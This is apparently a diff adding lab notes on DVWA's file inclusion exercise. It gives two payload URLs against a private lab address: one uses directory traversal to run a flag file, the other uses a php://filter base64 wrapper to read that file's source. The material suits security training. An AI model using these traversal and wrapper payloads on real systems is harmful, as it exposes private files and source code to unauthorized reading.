@@ -1,0 +1,5 @@
+Executes the file:
+http://192.168.56.105:8080/vulnerabilities/fi/?page=../../hackable/flags/fi.php
+
+Retrieves the file contents encoded with Base64:
+http://192.168.56.105/DVWA/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../hackable/flags/fi.php
